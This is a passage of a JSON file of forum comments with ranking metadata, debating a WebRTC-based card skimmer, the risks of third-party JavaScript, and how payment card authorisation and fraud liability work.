p": 11.54, "bs": 0.0, "d": 3, "age": 22.35, "grav": 313.0, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 2, "lu": 0, "w": 99, "qw": 0, "k": 12973, "kpp": 4.3, "td": 0.0, "mod": 0, "pp": 3, "meme": 0, "tier": "epistemic_gold", "facet": "browsers_etc", "flbl": "Browsers & Etc (Ads)", "urls": ["https://github.com/atomirex/umbrella"], "ig": 1.821, "fa": 2.08, "gp": 0.921, "bl": 0.0, "ds": 0.0, "txt": "The moment you have more than two participants in a video chat it makes sense to use a relay node to reduce the bandwidth needed at each node. (See https://github.com/atomirex/umbrella <- shameless pre AI code).\n\nP2P does things like exposes both participants IP straight to the other which are not desirable in the modern world. (Also the amount of networking metadata generated during connection negotiation is terrifying).\n\nOnce you're over those then the entire P2P side of the API looks like an anti feature. (But I am strongly in the camp of believing we need better unreliable network protocol support within HTTP channels)."}, {"id": 50673291, "au": "judge2020", "dom": 25, "sr": 3, "sc": 10.75, "ep": 11.05, "bs": 0.0, "d": 5, "age": 15.64, "grav": 175.3, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 3, "lu": 0, "w": 39, "qw": 0, "k": 19369, "kpp": 2.7, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "epistemic_gold", "facet": "block_malware", "flbl": "Block & Malware (Crimes)", "urls": ["https://www.w3.org/TR/CSP3/", "https://developer.chrome.com/blog/connection-allowlist-announcement"], "ig": 1.295, "fa": 2.35, "gp": 0.901, "bl": 0.0, "ds": 0.0, "txt": "Looks like that's only in Content Security Policy Level 3[0] which is in a working draft stage. It currently does nothing in Chrome or Firefox.\n\nRight now there is a chrome-only policy to block it called Connection-Allowlist[1] eg\n\n    Connection-Allowlist: (response-origin); webrtc=block\n\n\n0: https://www.w3.org/TR/CSP3/\n\n1: https://developer.chrome.com/blog/connection-allowlist-annou..."}, {"id": 50669279, "au": "tialaramex", "dom": 94, "sr": 4, "sc": 9.55, "ep": 9.55, "bs": 0.0, "d": 1, "age": 23.15, "grav": 331.8, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 1, "lu": 0, "w": 375, "qw": 0, "k": 33173, "kpp": 2.7, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "epistemic_gold", "facet": "card_fraud", "flbl": "Card & Fraud (Credit)", "urls": ["https://www.bbc.co.uk/news/uk-england-45400234", "https://www.bbc.co.uk/news/business-41061781"], "ig": 1.948, "fa": 1.3, "gp": 0.875, "bl": 0.0, "ds": 0.0, "txt": "One important thing to understand about payment cards in particular is the distinction between \"Settlement\" and \"Authorisation\"\n\nSettlement is the process by which Bank A with your money, or possibly your debt if it's a credit card, gives money to Bank B representing a merchant where ostensibly you paid with the payment card.\n\nSettlement is basically still the same \"Honour System\" process as it was last century, it's probably no longer literally magnetic tapes or punched cards, but cryptography has no real role here. Because this relies on that Honour System, mere accidents can result in transactions which should not exist. At a societal level e.g. a big bank mistakenly runs MAIN1 MAIN2 MAIN2 MAIN4 files through their settlement process one night, and the next morning people whose transactions were in MAIN2 realise they've been charged twice! Meanwhile retailers relying on MAIN3 being processed are distraught to find that magically they got nothing. Oops, fat finger. e.g.\n\nhttps://www.bbc.co.uk/news/uk-england-45400234\nhttps://www.bbc.co.uk/news/business-41061781\n\nAuthorization is the step where there's something resembling modern security. This step is there to protect Banks and Merchants from Customers, who they don't trust as far as they could throw you. Although Banks and Merchants are so often involved in fraud, they both love blaming Customers and so hence they require Au"}, {"id": 50670622, "au": "amluto", "dom": 184, "sr": 5, "sc": 9.25, "ep": 9.25, "bs": 0.0, "d": 4, "age": 21.22, "grav": 287.5, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 161, "qw": 5, "k": 25857, "kpp": 3.6, "td": 0.0, "mod": 0, "pp": 3, "meme": 0, "tier": "epistemic_gold", "facet": "companies_liable", "flbl": "Companies & Liable (User)", "urls": [], "ig": 1.962, "fa": 0.7, "gp": 1.825, "bl": 0.0, "ds": 0.0, "txt": "> There is no other way.\n\nOf course there is. It’s called sandboxing.\n\nThis would be solved by an extremely straightforward regulation.  I would propose:\n\nIf a website operator grants another company the ability to modify their website, they are liable for any effects of such a grant of control as though they had done it themselves.  Additionally, to the extent that any law, regulation or contract requires a website operator to maintain confidentiality or privacy of user data, granting a third party the ability to violate the requirement is deemed violated even if the third party did not exercise that ability.\n\nSo, for example, a healthcare company that includes an ad script violates HIPPA if the provider is not itself HIPPA compliant regardless of whether the ad script read any data.  If your chatbot said they would not train on your data but they included an unprotected ad script, then they presumptively sold your data and trained on it.\n\nGrant some small defense if the side operator credibly attempted to ensure security."}, {"id": 50668983, "au": "tialaramex", "dom": 269, "sr": 6, "sc": 7.96, "ep": 7.96, "bs": 0.0, "d": 1, "age": 23.55, "grav": 341.3, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 176, "qw": 0, "k": 33173, "kpp": 2.7, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "epistemic_gold", "facet": "ads_site", "flbl": "Ads & Site (Javascript)", "urls": [], "ig": 2.081, "fa": 0.68, "gp": 0.781, "bl": 0.0, "ds": 0.0, "txt": "I never loved those pages (typically from some middle men not my actual provider) because they usually looked like crap web sites bad guys would knock together, suspicious DNS names, poor site design, vague wording - it was like somebody attended a conference talk which said \"High quality does not mean it's legitimate\" and their take away was \"Do a terrible job and that will seem authentic somehow\".\n\nFor months (years?) now when I buy something on a web site the payment process tickles the bank's app on my phone and I have to confirm the purchase in that app, so you can't meaningfully \"steal\" or \"skim\" that step. The app was designed by somebody who has apparently at least skim read a book about UX, and I rarely scream and want to throw my phone at a wall while using it unlike those old web sites.\n\nIf I'm buying a $10 Christmas bauble on MyFunXmasGifts.present or whatever stupid URL and then my phone wants a confirmation for a $50 UberEats transaction, that's a \"No\" and you just got yourself flagged for attempted fraud.\n\nI wonder how many people this works for though."}, {"id": 50677667, "au": "coldtea", "dom": 123, "sr": 7, "sc": 7.82, "ep": 7.82, "bs": 0.0, "d": 2, "age": 2.66, "grav": 16.0, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 127, "qw": 43, "k": 94018, "kpp": 2.3, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "epistemic_gold", "facet": "browsers_etc", "flbl": "Browsers & Etc (Ads)", "urls": [], "ig": 1.915, "fa": 0.76, "gp": 0.799, "bl": 0.0, "ds": 0.0, "txt": ">How would you handle items with customization such as custom engravings?\n\nIs this supposed to be a generally applicable example, or that we should base the design of web commerce moving trillions of dollars to the needs of such niche areas?\n\nLet's do \"limit the long tail of features\" for 80% of things that don't need it, so that my grandma can buy sweaters without needed a degree in cybersecurity.\n\nWe can have a special laxer renderer for that  that comes up with red blinking alerts when you visit those pages.\n\nNothing about an example like custom engraving requires the current everything-available web model anyway. As an example we have remotely rendered 3d gaming GeForce NOW, xCloud, etc. We surely can support something like placing an engraving text on a product.\n\n>How to avoid discounts based on item combinations that are store-specific? Is your browser smart enough to do complex searches and filters for things like photo gear where some values have ranges?\n\nYou know we can have server side logic since the 90s, right?"}, {"id": 50675763, "au": "SkiFire13", "dom": 65, "sr": 8, "sc": 7.82, "ep": 7.97, "bs": 0.0, "d": 5, "age": 8.12, "grav": 64.4, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 277, "qw": 39, "k": 2145, "kpp": 2.2, "td": 0.0, "mod": 0, "pp": 3, "meme": 0, "tier": "epistemic_gold", "facet": "card_fraud", "flbl": "Card & Fraud (Credit)", "urls": [], "ig": 1.956, "fa": 0.7, "gp": 0.95, "bl": 0.0, "ds": 0.0, "txt": "> Processing payments and figuring out fraud is the payment processors responsibility - leave it to them, you aren't going to be able to do it correctly! Are vendors not able to flag suspected fraud when sending a transaction to the processor?\n\nWhat are you referring to with \"vendor\" and \"payment processor\"?\n\nNormally a transaction follows this chain:\n\n    - merchant\n    - payment gateway (e.g. Stripe)\n    - acquiring bank (often the same as the payment gateway)\n    - payment network (Visa/Mastercard)\n    - issuing bank (the one giving the CC to the customer)\n\nAll intermediaries are mostly not liable, most often either the merchant or the acquiring bank is.\n\nMerchants have limited means of flagging suspected transactions. Sometimes they can be helped by payment gateways (for an extra fee $$), which can see a lot more traffic and thus have more data on fraudolent patterns.\n\nIssuer banks have the other side of the data (what looks like a normal transaction for this customer?) but generally lack some data on the transaction itself (e.g. which ip/device does it come from?). 3DS Data-Only kinda helps with this, but of course merchants are also asked fees $$ to enable it. Also 3DS has a frictionless mode that merchants can request and issuer banks can approve where only this extra data is sent.\n\nBut at the end of the day all of this is imperfect and is also part of the reason why som"}, {"id": 50669638, "au": "hysan", "dom": 218, "sr": 9, "sc": 7.63, "ep": 7.78, "bs": 0.0, "d": 2, "age": 22.62, "grav": 319.4, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 92, "qw": 0, "k": 3106, "kpp": 4.6, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "epistemic_gold", "facet": "companies_liable", "flbl": "Companies & Liable (User)", "urls": [], "ig": 1.729, "fa": 0.68, "gp": 1.226, "bl": 0.0, "ds": 0.0, "txt": "Unrealistic in today’s world. I ran noscript by default and did exactly as you described from 2007(?) to around 2013. I eventually gave up because those js scripts grew faster than you could manage. Sites also caught on and would chunk required js into js that is meant primarily for serving third party ads. Those ads don’t load, those js chunks would fail and content won’t load. Sure I stopped reading some sites because of that but this practice spread to the point where the internet became unusable. What you say sounds doable but isn’t in practice."}, {"id": 50668600, "au": "stryan", "dom": 271, "sr": 10, "sc": 7.37, "ep": 7.37, "bs": 0.0, "d": 0, "age": 24.14, "grav": 355.7, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 42, "qw": 32, "k": 1445, "kpp": 3.8, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "grounded_analysis", "facet": "browsers_etc", "flbl": "Browsers & Etc (Ads)", "urls": [], "ig": 1.418, "fa": 0.7, "gp": 1.408, "bl": 0.0, "ds": 0.0, "txt": "> This form of attack appears to target mobile devices, and we only saw the server enable the skimmer on checkout pages, so desktop checks and homepage scans would likely not see it\n\nFinally, the millennial habit of making certain purchase from a desktop computer only pays off.\n\nI am actually curious why this specifically targets small screens though. Are mobile browsers more likely to allow the WebRTC connection? Or is this just to bypass vendor testing."}, {"id": 50672946, "au": "lxgr", "dom": 97, "sr": 11, "sc": 7.26, "ep": 8.4, "bs": 0.85, "d": 4, "age": 16.4, "grav": 189.1, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 99, "qw": 10, "k": 22198, "kpp": 2.2, "td": 0.0, "mod": 0, "pp": 4, "meme": 0, "tier": "epistemic_gold", "facet": "card_fraud", "flbl": "Card & Fraud (Credit)", "urls": [], "ig": 1.731, "fa": 0.98, "gp": 1.063, "bl": 0.32, "ds": 0.0, "txt": "> some issuers had definitely switched to DDA (\"expensive\") and back\n\nThat's really surprising, I was under the impression that DDA or CDA were essentially a given at the very least since open loop transit became a thing. (I don't think it's possible to use a non ODA or SDA only card at a TfL fare gate, for example.)\n\nFWIW, this doesn't necessarily have to be a conscious decision to move back to an older standard. There's quite some lead time between ordering blank card stock and actually receiving it for banks or their suppliers, so stocks can be substantial and need to be burned down etc., which could explain what looks like a regression from the outside."}, {"id": 50671363, "au": "vladms", "dom": 185, "sr": 12, "sc": 6.91, "ep": 7.2, "bs": 0.0, "d": 5, "age": 19.98, "grav": 260.4, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 84, "qw": 0, "k": 844, "kpp": 1.5, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "grounded_analysis", "facet": "card_fraud", "flbl": "Card & Fraud (Credit)", "urls": [], "ig": 1.516, "fa": 0.34, "gp": 1.842, "bl": 0.0, "ds": 0.0, "txt": "Isn't someone liable today? Not sure why shifting liability around solves much.\n\nAnd how about fixing the actual credit card system directly? There are some banking systems (ex: IDEAL - now I think rebranded as Wero - in the Netherlands) that just ask for authentication with a trusted device when you want to do a transaction, so there is no problem from people knowing your card number. The idea that in 2026 there is a \"security code\" written on a card is mind-boggling. Would you recommend writing your password on the monitor?"}, {"id": 50670727, "au": "godwinson__4-8", "dom": 164, "sr": 13, "sc": 6.68, "ep": 7.13, "bs": 0.0, "d": 1, "age": 21.04, "grav": 283.5, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 269, "qw": 0, "k": 538, "kpp": 1.4, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "grounded_analysis", "facet": "ads_site", "flbl": "Ads & Site (Javascript)", "urls": [], "ig": 2.079, "fa": 0.28, "gp": 0.995, "bl": 0.0, "ds": 0.0, "txt": "Ads are just one particular case of the problem.\n\nSites everywhere are fat with JavaScript doing all sorts of unnecessary things. Why trust anyone's JavaScript at all?\n\nEverything should be API first and ship with a JavaScript less default. Your local AI agent who you engineer your trust model around builds any desired runtime scripting for you at runtime, dynamically the first time and iteratively tuned to you thereafter. For many sites you won't care and will accept defaults or a buddy's template.\n\nWe need legislation to enforce API only access to any public website. Any public frontend must be rebuildable with data from a public API.\n\nThe problem with AI is the incentives of people shoving JavaScript in your face (or useless exposition when trying to divine a Thanksgiving recipe vs the ease of AI mode, for instance) undermine the promise of the entire AI technology - every frontend for every person can be entirely unique and yet entirely coherent. No gatekeepers. Instead of ads send a microtransaction if need be to every API, or the government can subsidize.\n\nFocusing on ads is missing the point. The real issue is your client running scripts you did not explicitly ask or delegate it to. The entire Internet is adversarial in this way, not because of ads but because people expect access and no one wants to pay for anything. People who block ads simply contribute to this proble"}, {"id": 50671276, "au": "sam1714", "dom": 200, "sr": 14, "sc": 6.67, "ep": 7.11, "bs": 0.0, "d": 6, "age": 20.12, "grav": 263.5, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 1, "lu": 0, "w": 54, "qw": 73, "k": 209, "kpp": 2.5, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "grounded_analysis", "facet": "companies_liable", "flbl": "Companies & Liable (User)", "urls": ["https://law.justia.com/codes/tennessee/title-29/chapter-28/section-29-28-106/"], "ig": 1.142, "fa": 1.04, "gp": 1.009, "bl": 0.0, "ds": 0.0, "txt": "The seller of a good generally is liable in the US. It's due to common law in torts. The traditional reference is the Second Restatement of Torts, section 402A which says\n\n> One who sells any product in a defective condition unreasonably dangerous to the user or consumer or to his property is subject to liability for physical harm thereby caused to the ultimate user or consumer, or to his property, if\n\n> (a) the seller is engaged in the business of selling such a product, and\n\n> (b) it is expected to and does reach the user or consumer without substantial change in the condition in which it is sold.\n\nSome states have laws that exclude the seller if the manufacturer can be sued [1], but note exceptions of manufacturer bankrupt or can't be reached.\n\n[1] https://law.justia.com/codes/tennessee/title-29/chapter-28/s..."}, {"id": 50677708, "au": "coldtea", "dom": 121, "sr": 15, "sc": 6.55, "ep": 6.69, "bs": 0.0, "d": 4, "age": 2.59, "grav": 15.6, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 85, "qw": 0, "k": 94018, "kpp": 2.3, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "grounded_analysis", "facet": "ads_site", "flbl": "Ads & Site (Javascript)", "urls": [], "ig": 1.489, "fa": 0.68, "gp": 0.866, "bl": 0.0, "ds": 0.0, "txt": "I'm not sure I understand all the contrived examples.\n\nYes, you could do that. Works fine. How often should it need to be?\n\nOr it could resend a diff of the page. We have remotely rendered AAA game platforms, where you just get some video back at 60fps, we can surely send commerce changes too even at 1/1000 the bandwidth.\n\nOr you could have something like Ajax/XHR/messaging, or pub/sub push of plain data, no need to \"the browser can be send any arbitrary code to execute\"."}, {"id": 50671435, "au": "streetfighter64", "dom": 115, "sr": 16, "sc": 6.05, "ep": 6.56, "bs": 0.0, "d": 1, "age": 19.83, "grav": 257.1, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 155, "qw": 34, "k": 226, "kpp": 0.6, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "grounded_analysis", "facet": "ads_site", "flbl": "Ads & Site (Javascript)", "urls": [], "ig": 1.744, "fa": 0.42, "gp": 0.874, "bl": 0.0, "ds": 0.0, "txt": "> allow strangers to run random code on your computer\n\n> deliver just data and my browser decides what to do with it\n\nCode is data and your browser decides to execute it. A toy example, but HTML+CSS is Turing complete. The problem thus isn't that it's \"code\", but rather that it's not properly sandboxed.\n\n> my shop browser decides how to operate with the catalogue in a way I want\n\nAre you making a case for built-in components for e.g. sorting and filtering and what have you? To me that's just way more clunky than having an actual programming language. Even PDF, a static document format with no real user interaction, has a programming language (PostScript) embedded.\n\nSo in my view, the problem with JS isn't the features of the language itself, rather that the standard library has too much power, to make requests and access your microphone and stuff like that.\n\nBut even then, people want to use their computer to do video calls, and whatnot. And I for one much prefer using Zoom or Teams or such in the web app, instead of downloading the app version. Precisely because the web app is more tightly sandboxed."}, {"id": 50672622, "au": "kelnos", "dom": 29, "sr": 17, "sc": 5.82, "ep": 6.26, "bs": 0.0, "d": 4, "age": 17.21, "grav": 204.3, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 79, "qw": 20, "k": 46483, "kpp": 3.0, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "grounded_analysis", "facet": "browsers_etc", "flbl": "Browsers & Etc (Ads)", "urls": [], "ig": 1.537, "fa": 0.42, "gp": 1.002, "bl": 0.0, "ds": 0.0, "txt": "> P2P does things like exposes both participants IP straight to the other which are not desirable in the modern world.\n\nIs this actually a problem?  I don't think it's a good security posture to consider knowledge of your IP to be a security boundary.  You give out your IP to every website you visit and every service you connect to.  Some of those websites are undoubtedly shipping your IP off to analytics platforms and other sketchy 3rd parties.\n\nIf you do need your IP to remain private, you're using a VPN, Tor, proxies, etc.  But only a small minority of people really need this."}, {"id": 50678357, "au": "__MatrixMan__", "dom": 44, "sr": 18, "sc": 5.78, "ep": 6.44, "bs": 0.0, "d": 5, "age": 1.5, "grav": 9.5, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 173, "qw": 0, "k": 10035, "kpp": 2.0, "td": 0.0, "mod": 0, "pp": 3, "meme": 0, "tier": "grounded_analysis", "facet": "card_fraud", "flbl": "Card & Fraud (Credit)", "urls": [], "ig": 1.894, "fa": 0.34, "gp": 0.701, "bl": 0.0, "ds": 0.0, "txt": "Maybe 5 years ago or so most banks changed policy: if a card was present, then chip or nft is encouraged. If  that happens the transaction is \"tokenized\" (poor choose of terminology) meaning that instead of the card number, a signed payload is used. Private key never leaves the card.\n\nIf this is avoided, either via magnetic strip or typing the number in, the merchant pays the cost of the fraud. This was the policy change, mostly to justify the sale of next gen POS equipment.  It worked, equipment was sold, most transactions are now protected, most merchants I know would be ready to have the old way stop working.\n\nBut it was only ever about selling upgraded hardware. The same banks have relationships with people who do card-not-present payments. There was no opportunity to sell an upgraded device here, so there was no effort to modernize. For these transactions, rather than equipping people with the tools they'd need to use their card wherever they are, we just tolerate the fraud and everybody bears the cost."}, {"id": 50669072, "au": "thinkling", "dom": 242, "sr": 19, "sc": 5.71, "ep": 5.71, "bs": 0.0, "d": 1, "age": 23.42, "grav": 338.2, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 59, "qw": 0, "k": 1395, "kpp": 2.6, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "grounded_analysis", "facet": "block_malware", "flbl": "Block & Malware (Crimes)", "urls": [], "ig": 1.753, "fa": 0.22, "gp": 0.662, "bl": 0.0, "ds": 0.0, "txt": "It appears to vary. The table early in the article lists a few paths used on different e-commerce sites:\n\n- “Altered Quorum* marketing pixel”\n\n- “Edited Seers† cookie-banner setting”\n\n- “Altered file on Revolve's own CDN”\n\nThe former two might be blocked by an ad blocker or JS blocker; the latter sounds trickier when the script comes from the vendor’s own compromised site."}, {"id": 50676619, "au": "anon7000", "dom": 43, "sr": 20, "sc": 5.5, "ep": 6.39, "bs": 0.0, "d": 5, "age": 5.02, "grav": 33.4, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 84, "qw": 0, "k": 2315, "kpp": 2.9, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "grounded_analysis", "facet": "card_fraud", "flbl": "Card & Fraud (Credit)", "urls": [], "ig": 1.63, "fa": 0.34, "gp": 1.093, "bl": 0.0, "ds": 0.0, "txt": "I haven’t seen someone use magnetic stripe in a while, maybe unless it’s an old restaurant in a small town that hasn’t touched its technology in a couple decades.\n\nContactless is very common in the US, but the card readers are frequently utter dogshit (slow and unreliable) for some reason. If someone has to physically use a card, chances are they have to insert it to read the chip, no swipe.\n\nMany restaurants in cities use Toast-style terminals. I’d say I can use Apple Pay about 75% of my transactions in person"}, {"id": 50672577, "au": "tialaramex", "dom": 96, "sr": 21, "sc": 5.28, "ep": 6.38, "bs": 0.0, "d": 3, "age": 17.37, "grav": 207.4, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 81, "qw": 14, "k": 33173, "kpp": 2.7, "td": 0.0, "mod": 0, "pp": 3, "meme": 0, "tier": "grounded_analysis", "facet": "card_fraud", "flbl": "Card & Fraud (Credit)", "urls": [], "ig": 1.702, "fa": 0.42, "gp": 0.817, "bl": 0.0, "ds": 0.0, "txt": "> These days, essentially all cards support asymmetric cryptography, i.e. are the \"expensive type of card\"\n\nThe last time I spent any time researching this, which is a good number of years ago, some issuers had definitely switched to DDA (\"expensive\") and back, seemingly because of PR. That is, incidents of fraud cause media coverage => new cards are DDA, fraud epidemic subsides => back to SDA, fraud rises again, but this time it gets no coverage because we already covered that story.\n\nPerhaps the chips got so cheap it doesn't make any sense to distinguish now, which would be good."}, {"id": 50670750, "au": "ebertucc", "dom": 122, "sr": 22, "sc": 5.27, "ep": 6.15, "bs": 0.0, "d": 2, "age": 21.01, "grav": 282.8, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 61, "qw": 0, "k": 72, "kpp": 2.6, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "grounded_analysis", "facet": "ads_site", "flbl": "Ads & Site (Javascript)", "urls": [], "ig": 1.722, "fa": 0.0, "gp": 1.452, "bl": 0.0, "ds": 0.0, "txt": "An optimistic path I see is LLMs making browsers smart enough to whip up personalized, ad hoc UIs for everything you suggest while every server becomes a glorified data provider as per the GP comment.\n\nYou'd still have to trust the hardware, OS, browser, and now an LLM too, but that threat model could be preferable to running arbitrary (especially 3rd party) Javascript."}, {"id": 50670351, "au": "superkuh", "dom": 285, "sr": 23, "sc": 5.05, "ep": 5.27, "bs": 0.0, "d": 0, "age": 21.66, "grav": 297.2, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 65, "qw": 0, "k": 14461, "kpp": 2.8, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "grounded_analysis", "facet": "browsers_etc", "flbl": "Browsers & Etc (Ads)", "urls": [], "ig": 1.436, "fa": 0.34, "gp": 0.638, "bl": 0.0, "ds": 0.0, "txt": "It's amazing to me that we as society have become disdainful of anyone that doesn't automatically execute computer programs sent by unknown arbitrary third parties from random domain names.\n\n20 years ago everyone knew not to open and execute any program sent to you by someone you don't know. Or even someone you do. Now this wisdom has been lost and even flipped on it's head."}, {"id": 50668592, "au": "afavour", "dom": 11, "sr": 24, "sc": 5.02, "ep": 5.46, "bs": 0.0, "d": 0, "age": 24.15, "grav": 356.0, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 61, "qw": 0, "k": 30881, "kpp": 6.1, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "grounded_analysis", "facet": "companies_liable", "flbl": "Companies & Liable (User)", "urls": [], "ig": 1.424, "fa": 0.0, "gp": 1.457, "bl": 0.0, "ds": 0.0, "txt": "Worth noting that this isn’t really anything to do with the technical capabilities of WebRTC, it’s just that it’s less frequently monitored for nefarious behavior. Same reason they’re only targeting mobile devices: harder to detect.\n\nNo reason this approach couldn’t be taken with simple HTTP requests. If you’re embedding third party scripts on your site you’re always vulnerable."}, {"id": 50669466, "au": "eddythompson80", "dom": 211, "sr": 25, "sc": 4.83, "ep": 5.27, "bs": 0.0, "d": 1, "age": 22.89, "grav": 325.7, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 122, "qw": 0, "k": 3629, "kpp": 3.1, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "grounded_analysis", "facet": "block_malware", "flbl": "Block & Malware (Crimes)", "urls": [], "ig": 1.549, "fa": 0.0, "gp": 1.122, "bl": 0.0, "ds": 0.0, "txt": "I do feel some of the sanctimony is warranted because saying you block ads for security of privacy reasons, to me, is like saying you put a no solicitations sign in your front because you’re worried about potential intruders or robbers . It’s possible that some robbers might pretend to be solicitors to learn more about the place and what not, but ultimately the sign is there to stop annoying people who are trying to sell you some bs from wasting your time.\n\nIf you’re actual concern is security or privacy, then block all JS, especially 3P JS but even 1P too, and allow it only as needed. If you use ublock origin, it’s very straight forward to do and manager per domain."}, {"id": 50672134, "au": "lxgr", "dom": 85, "sr": 26, "sc": 4.77, "ep": 6.09, "bs": 0.0, "d": 1, "age": 18.42, "grav": 228.1, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 124, "qw": 16, "k": 22198, "kpp": 2.2, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "grounded_analysis", "facet": "card_fraud", "flbl": "Card & Fraud (Credit)", "urls": [], "ig": 1.736, "fa": 0.42, "gp": 0.561, "bl": 0.0, "ds": 0.0, "txt": "We're not even using symmetric key cryptography, we're using globally scoped bearer tokens of very, very questionable entropy. \"Publics\" much more than secrets, really.\n\n> I suspect that the people who could change this are more interested in continued treatment than cure.\n\nThere is no cabal. It's game theory all the way down: Whoever unilaterally trades off some convenience for a little bit of security will lose out to their competitors.\n\nRegulators could fix it by mandating security (and thereby keeping the playing field level), in the way that e.g. the EU largely solved this problem (at least for intra-EU payments; unfortunately compromised EU cards can still be readily used at US online merchants), but I have a feeling that in the US, there isn't really political will for that. Too many stakeholders are benefiting from the status quo in one way or another."}, {"id": 50673333, "au": "judge2020", "dom": 30, "sr": 27, "sc": 4.64, "ep": 5.52, "bs": 0.0, "d": 5, "age": 15.52, "grav": 173.2, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 116, "qw": 0, "k": 19369, "kpp": 2.7, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "grounded_analysis", "facet": "browsers_etc", "flbl": "Browsers & Etc (Ads)", "urls": [], "ig": 1.731, "fa": 0.0, "gp": 0.999, "bl": 0.0, "ds": 0.0, "txt": "In general the websites you visit know your IP, but not other users you interact with on social media (or chat apps etc).\n\nSocial media users are more likely to have a personal interest in doing you harm by doing illegal (but not often prosecuted) things, like using your IP address to find your general IP location, DDOS you, scan your network for open ports/vulnerabilities and exploit them, phish your ISP into giving up your address (which can then be used to SWAT/stalk/etc), etc.\n\nSomeone who is vigilant about what links they click is probably not going to click coolwebsite.netlify.app, but might be fine going to zoom.us or meet.google.com."}, {"id": 50670235, "au": "snickerer", "dom": 111, "sr": 28, "sc": 4.6, "ep": 5.7, "bs": 0.0, "d": 0, "age": 21.83, "grav": 301.1, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 63, "qw": 0, "k": 1051, "kpp": 5.7, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "grounded_analysis", "facet": "ads_site", "flbl": "Ads & Site (Javascript)", "urls": [], "ig": 1.463, "fa": 0.0, "gp": 1.561, "bl": 0.0, "ds": 0.0, "txt": "One basic design no-go of the www is to allow strangers to run random code on your computer. It is just not acceptable. Servers should deliver just data and my browser decides what to do with it. A shop should deliver lists of items and prizes and my shop browser decides how to operate with the catalogue in a way I want. Everying else is nuts."}, {"id": 50672255, "au": "amluto", "dom": 191, "sr": 29, "sc": 4.6, "ep": 5.26, "bs": 0.0, "d": 6, "age": 18.17, "grav": 223.0, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 94, "qw": 0, "k": 25857, "kpp": 3.6, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "grounded_analysis", "facet": "companies_liable", "flbl": "Companies & Liable (User)", "urls": [], "ig": 1.687, "fa": 0.0, "gp": 0.892, "bl": 0.0, "ds": 0.0, "txt": "Can we please acknowledge that not all ads are surveillance based?\n\nI’m fine with companies paying a podcast host to mention their products (as long as the payment is acknowledged).  I’m fine with companies paying to be shown on billboards (but I’m maybe not fine with permitting the billboards in the first place).  I’m fine with print ads. I’m fine with conventional TV ads. I’d be fine with ads in online videos if (a) it was just content and not script and (b) the ad shown was purely a function of the video, possibly the time, and possibly the coarse geography of the viewer."}, {"id": 50669506, "au": "theturtletalks", "dom": 255, "sr": 30, "sc": 4.37, "ep": 5.03, "bs": 0.0, "d": 0, "age": 22.84, "grav": 324.6, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 97, "qw": 0, "k": 4060, "kpp": 3.5, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "grounded_analysis", "facet": "browsers_etc", "flbl": "Browsers & Etc (Ads)", "urls": [], "ig": 1.545, "fa": 0.0, "gp": 0.965, "bl": 0.0, "ds": 0.0, "txt": "I’m building an e-commerce SaaS and was originally going to have an App Store model like Shopify. But with agents, I don’t think SaaS need this anymore. You are trusting your store and business to 